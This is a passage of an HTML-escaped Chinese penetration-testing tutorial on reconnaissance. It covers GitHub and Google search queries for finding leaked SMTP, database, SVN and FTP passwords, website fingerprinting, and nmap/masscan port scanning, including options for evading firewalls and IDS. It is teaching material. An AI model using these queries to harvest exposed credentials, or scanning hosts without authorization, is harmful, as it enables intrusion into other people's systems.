#指定仓库大于5000k(5M)的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user:test #用户名搜素&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;language:java test #在java语言的代码中搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user:test in:name test #组合搜索,用户名test的标题含有test的&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用-github-进行邮件配置信息收集\&quot;&gt;使用 Github 进行邮件配置信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用-github-进行邮件配置信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @qq.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @126.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @163.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp @sina.com.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com smtp password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com String password smtp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;……&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的\n&lt;code&gt;site:Github.com smtp @baidu.com&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;使用github进行数据库信息收集\&quot;&gt;使用Github进行数据库信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行数据库信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com sa password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com root password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com User ID=’sa’;Password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com inurl:sql&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用github进行-svn-信息收集\&quot;&gt;使用Github进行 SVN 信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行-svn-信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn username&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com svn username password&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;使用github进行综合信息收集\&quot;&gt;使用Github进行综合信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用github进行综合信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com password&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com ftp ftppassword&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:Github.com 密码&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网站指纹识别\&quot;&gt;网站指纹识别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站指纹识别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。\n常见的网站指纹识别工具有：whatweb等。\n在线指纹识别网站：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;BugScaner：&lt;a href=\&quot;http://whatweb.bugscaner.com/look/\&quot;&gt;http://whatweb.bugscaner.com/look/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;云悉指纹：&lt;a href=\&quot;http://www.yunsee.cn/finger.html\&quot;&gt;http://www.yunsee.cn/finger.html&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;WhatWeb：&lt;a href=\&quot;https://whatweb.net/\&quot;&gt;https://whatweb.net/&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h1 id=\&quot;整站分析\&quot;&gt;整站分析&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#整站分析\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;服务器类型linuxwindows\&quot;&gt;服务器类型（Linux/windows）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#服务器类型linuxwindows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的&lt;/p&gt;\n&lt;p&gt;而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来&lt;/p&gt;\n&lt;h2 id=\&quot;网站容器apachenginxtomcatiis\&quot;&gt;网站容器（Apache/Nginx/Tomcat/IIS）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站容器apachenginxtomcatiis\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&amp;#x3C;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞&lt;/p&gt;\n&lt;h2 id=\&quot;脚本类型phpjspaspaspx\&quot;&gt;脚本类型（php/jsp/asp/aspx）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#脚本类型phpjspaspaspx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;可以根据网站URL来判断&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;site:xxx filetype:php&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;可以根据Firefox的插件来判断&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&quot;数据库类型mysqloracleaccesssqlserver\&quot;&gt;数据库类型（Mysql/Oracle/Access/SQLserver）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据库类型mysqloracleaccesssqlserver\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的&lt;/p&gt;\n&lt;p&gt;几种数据库的区别:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb   一般是asp的网页文件用access数据库&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。&lt;/p&gt;\n&lt;p&gt;常见搭配：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;ASP 和 ASPX：ACCESS、SQL Server&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;PHP：MySQL、PostgreSQL&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;JSP：Oracle、MySQL&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h1 id=\&quot;第六章主机扫描\&quot;&gt;第六章主机扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#第六章主机扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。&lt;/p&gt;\n&lt;p&gt;主机扫描的工具也有很多，比如：Nessus、AWVS&lt;/p&gt;\n&lt;h1 id=\&quot;第七章端口扫描nmap\&quot;&gt;第七章端口扫描（nmap）&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#第七章端口扫描nmap\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;22——&gt;ssh弱口令&lt;/li&gt;\n&lt;li&gt;873——&gt;rsync未授权访问漏洞&lt;/li&gt;\n&lt;li&gt;306——&gt;mysql弱口令&lt;/li&gt;\n&lt;li&gt;6379——&gt;redis未授权访问漏洞\n端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。\nmasscan示例 ：&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;masscan 192.168.10.152 -p 0-65535 --rate=10000&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;nmap简介\&quot;&gt;nmap简介&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap简介\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;nmap四项基本功能：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;主机发现 (Host Discovery)\n-sn,-PE/PP/PM&lt;/li&gt;\n&lt;li&gt;端口扫描 (Port Scanning)\n-sS,-sT,-sA, -sN/sF/sX,-sU, -sY/-sZ&lt;/li&gt;\n&lt;li&gt;版本侦测 (Version Detection)\n-sV（可查看自定义的端口服务）&lt;/li&gt;\n&lt;li&gt;操作系统侦测 (Operating System Detection)\n-O，-osscan-limit,-osscan-guess,\n而在这四项功能的基础上，nmap还提供防火墙和 IDS 的规避技巧，可以综合运用到四个基本功能的各个阶段。另外nmap还提供强大的NSE(Nmap Scripting Language)脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n&lt;strong&gt;nmap参数&lt;/strong&gt;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;nmap –iflist : 查看本地主机的接口信息和路由信息&lt;/p&gt;\n&lt;p&gt;-A ：选项用于使用进攻性方式扫描&lt;/p&gt;\n&lt;p&gt;-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4&lt;/p&gt;\n&lt;p&gt;-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开&lt;/p&gt;\n&lt;p&gt;-oA test.xml: 将扫描结果生成 test.xml 文件，中断后，结果也可保存&lt;/p&gt;\n&lt;p&gt;-oG test.txt: 将扫描结果生成 test.txt 文件&lt;/p&gt;\n&lt;p&gt;-sn : 只进行主机发现，不进行端口扫描&lt;/p&gt;\n&lt;p&gt;-O : 指定Nmap进行系统版本扫描&lt;/p&gt;\n&lt;p&gt;-sV: 指定让Nmap进行服务版本扫描&lt;/p&gt;\n&lt;p&gt;-p &amp;#x3C;port ranges&gt;: 扫描指定的端口&lt;/p&gt;\n&lt;p&gt;-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描&lt;/p&gt;\n&lt;p&gt;-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况&lt;/p&gt;\n&lt;p&gt;-script &amp;#x3C;script name&gt; : 指定扫描脚本&lt;/p&gt;\n&lt;p&gt;-Pn ： 不进行ping扫描&lt;/p&gt;\n&lt;p&gt;-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping&lt;/p&gt;\n&lt;p&gt;-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。&lt;/p&gt;\n&lt;p&gt;-iL 1.txt : 批量扫描1.txt中的目标地址&lt;/p&gt;\n&lt;p&gt;-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现&lt;/p&gt;\n&lt;p&gt;-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况&lt;/p&gt;\n&lt;p&gt;-sO: 使用IP protocol 扫描确定目标机支持的协议类型&lt;/p&gt;\n&lt;p&gt;-PO : 使用IP协议包探测对方主机是否开启&lt;/p&gt;\n&lt;p&gt;-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机&lt;/p&gt;\n&lt;p&gt;-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现&lt;/p&gt;\n&lt;p&gt;-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态&lt;/p&gt;\n&lt;p&gt;-e eth0：指定使用eth0网卡进行探测&lt;/p&gt;\n&lt;p&gt;-f : —mtu &amp;#x3C;val&gt;: 指定使用分片、指定数据包的 MTU.&lt;/p&gt;\n&lt;p&gt;-b &amp;#x3C;FTP relay host&gt;: 使用FTP bounce scan扫描方式&lt;/p&gt;\n&lt;p&gt;-g： 指定发送的端口号&lt;/p&gt;\n&lt;p&gt;-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）&lt;/p&gt;\n&lt;p&gt;-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态&lt;/p&gt;\n&lt;p&gt;-n : 表示不进行DNS解析；&lt;/p&gt;\n&lt;p&gt;-D &amp;#x3C;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址&lt;/p&gt;\n&lt;p&gt;-R ：表示总是进行DNS解析。&lt;/p&gt;\n&lt;p&gt;-F : 快速模式，仅扫描TOP 100的端口&lt;/p&gt;\n&lt;p&gt;-S &amp;#x3C;IP_Address&gt;: 伪装成其他 IP 地址&lt;/p&gt;\n&lt;p&gt;—ttl &amp;#x3C;val&gt;: 设置 time-to-live 时间&lt;/p&gt;\n&lt;p&gt;—badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）&lt;/p&gt;\n&lt;p&gt;—dns-servers : 指定DNS服务器&lt;/p&gt;\n&lt;p&gt;—system-dns : 指定使用系统的DNS服务器&lt;/p&gt;\n&lt;p&gt;—traceroute : 追踪每个路由节点&lt;/p&gt;\n&lt;p&gt;—scanflags &amp;#x3C;flags&gt;: 定制TCP包的flags&lt;/p&gt;\n&lt;p&gt;—top-ports &amp;#x3C;number&gt; :扫描开放概率最高的number个端口&lt;/p&gt;\n&lt;p&gt;—port-ratio &amp;#x3C;ratio&gt;: 扫描指定频率以上的端口。与上述—top-ports类似，这里以概率作为参数&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;p&gt;—osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）&lt;/p&gt;\n&lt;p&gt;—osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统&lt;/p&gt;\n&lt;p&gt;—data-length &amp;#x3C;num&gt;: 填充随机数据让数据包长度达到 Num&lt;/p&gt;\n&lt;p&gt;—ip-options &amp;#x3C;options&gt;: 使用指定的 IP 选项来发送数据包&lt;/p&gt;\n&lt;p&gt;—spoof-mac &amp;#x3C;mac address/prefix/vendor name&gt; : 伪装 MAC 地址&lt;/p&gt;\n&lt;p&gt;—version-intensity &amp;#x3C;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。&lt;/p&gt;\n&lt;p&gt;—version-light: 指定使用轻量侦测方式 (intensity 2)&lt;/p&gt;\n&lt;p&gt;—version-all: 尝试使用所有的probes进行侦测 (intensity 9)&lt;/p&gt;\n&lt;p&gt;—version-trace: 显示出详细的版本侦测过程信息&lt;/p&gt;\n&lt;p&gt;nmap 192.168.1.0/24 -exclude 192.168.1.10 #扫描除192.168.1.0外的该网段的其他地址&lt;/p&gt;\n&lt;p&gt;nmap 192.168.1.0/24 -excludefile f:/1.txt #扫描除给定文件中的地址以外的其他地址&lt;/p&gt;\n&lt;h2 id=\&quot;nmap基本功能\&quot;&gt;nmap基本功能&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本功能\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;探测目标主机是否在线\&quot;&gt;探测目标主机是否在线&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#探测目标主机是否在线\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;当探测公网ip时\&quot;&gt;当探测公网IP时&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#当探测公网ip时\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;&lt;strong&gt;nmap –sn&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;Nmap会发送四种不同类型的数据包来探测目标主机是否在线。&lt;/p&gt;\n&lt;p&gt; &lt;/p&gt;\n&lt;p&gt;ICMP echo request&lt;/p&gt;\n&lt;p&gt;a TCP SYN packet to port 443(https)&lt;/p&gt;\n&lt;p&gt;a TCP ACK packet to port 80(http)&lt;/p&gt;\n&lt;p&gt;an ICMP timestamp request&lt;/p&gt;\n&lt;p&gt;依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;nmap -PE/-PP/-PM&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;-PE 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。&lt;/p&gt;\n&lt;p&gt;-PP 的ICMP time stamp时间戳扫描在大多数防火墙配置不当时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务&lt;/p&gt;\n&lt;p&gt;-PM 的ICMP address maskPing&lt;a href=\&quot;#\&quot; title=\&quot;#_msocom_6\&quot;&gt;[S6]&lt;/a&gt; 地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的穿透防火墙的效果&lt;/p&gt;\n&lt;h5 id=\&quot;当探测内网ip时\&quot;&gt;当探测内网IP时&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#当探测内网ip时\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;&lt;strong&gt;nmap -sn&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;使用 nmap  -sn  内网ip   这个命令会发送arp请求包探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;nmap -PE/-PP/-PM&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;使用nmap -PE/PP/PM  内网ip 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务&lt;/p&gt;\n&lt;h3 id=\&quot;722-端口扫描及原理\&quot;&gt;7.2.2 端口扫描及原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#722-端口扫描及原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h5 id=\&quot;原理\&quot;&gt;原理&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#原理\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。&lt;/p&gt;\n&lt;p&gt;默认情况下，Nmap会扫描1000个最有可能开放的TCP端口&lt;/p&gt;\n&lt;p&gt;Nmap通过探测将端口划分为6个状态：&lt;/p&gt;\n&lt;p&gt;open：端口是开放的。&lt;/p&gt;\n&lt;p&gt;closed：端口是关闭的。&lt;/p&gt;\n&lt;p&gt;filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。&lt;/p&gt;\n&lt;p&gt;unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。&lt;/p&gt;\n&lt;p&gt;open|filtered：端口是开放的或被屏蔽，Nmap不能识别。&lt;/p&gt;\n&lt;p&gt;closed|filtered ：端口是关闭的或被屏蔽，Nmap不能识别&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP SYN&lt;/strong&gt; &lt;strong&gt;扫描(-sS)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP connent&lt;/strong&gt; &lt;strong&gt;扫描(-sT)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标主机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP ACK&lt;/strong&gt; &lt;strong&gt;扫描(-sA)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。&lt;strong&gt;该方式只能用于确定防火墙是否屏蔽某个端口&lt;/strong&gt;，可以辅助TCP SYN的方式来判断目标主机防火墙的状况&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;TCP FIN/Xmas/NULL&lt;/strong&gt; &lt;strong&gt;扫描(-sN/sF/sX)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN 包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;UDP****扫描(-sU)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;UDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;其他方式(-sY/-sZ)&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP 